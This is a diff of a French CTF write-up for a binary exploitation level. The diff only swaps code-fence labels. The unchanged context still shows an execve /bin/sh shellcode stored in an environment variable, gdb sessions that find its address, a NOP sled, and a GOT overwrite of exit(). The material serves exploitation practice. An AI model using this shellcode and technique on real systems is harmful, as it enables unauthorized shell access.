@@ -58,7 +58,7 @@ L'adresse `GOT` pointe sur le "code source" de la fonction `exit()`. Avant d'att
 
 On peut observer ce comportement en analysant `exit()` avec `gdb`, mais sans `run` le binaire :
 
-```bash
+```h
 $ gdb ./level05 -q
 Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
 
@@ -100,13 +100,13 @@ Je ne peux donc pas insérer mon shellcode directement dans le buffer. Je cherch
 
 Je commence par stocker mon shellcode dans une variable env :
 
-```bash
+```h
 $ export SHELLCODE=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
 ```
 
 Puis cherche l'adresse de cette variable dans la mémoire du binaire avec `gdb` :
 
-```bash
+```h
 $ gdb ./level05 -q
 Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
 (gdb) b main
@@ -164,13 +164,13 @@ Cela ne marche toujours pas, alors je ré-inspecte ma solution.
 
 Je me rends compte que l'adresse que je passe :
 
-```bash
+```h
 0xffffd8d3:      "SHELLCODE=1\300Ph//shh/bin\211\343PS\211\341\260\v̀"
 ```
 
 Inclus la partie "SHELLCODE" :
 
-```bash
+```h
 (gdb) x/100bx 0xffffd8d3
 0xffffd8d3:     0x53    0x48    0x45    0x4c    0x4c    0x43    0x4f    0x44
 0xffffd8db:     0x45    0x3d    0x31    0xc0    0x50    0x68    0x2f    0x2f
@@ -201,7 +201,7 @@ $ export PAYLOAD=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
 
 Puis la trouve sa nouvelle adresse dans `gdb` :
 
-```bash
+```h
 ...
 0xffffdf9a:      "PAYLOAD=1\300Ph//shh/bin\211\343PS\211\341\260\v̀"
 ...
@@ -235,7 +235,7 @@ Grrrr, sans succès, j'analyse à nouveau les potentiels problèmes.
 
 Je me rappelle dans `Rainfall` avoir dû besoin de faire des `NOP sled`, ce qui revient à une instruction "nulle" mais qui peut aider à aligner la mémoire, j'en ajoute donc devant mon payload :
 
-```bash
+```h
 export PAYLOAD=$'\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
 ```
 
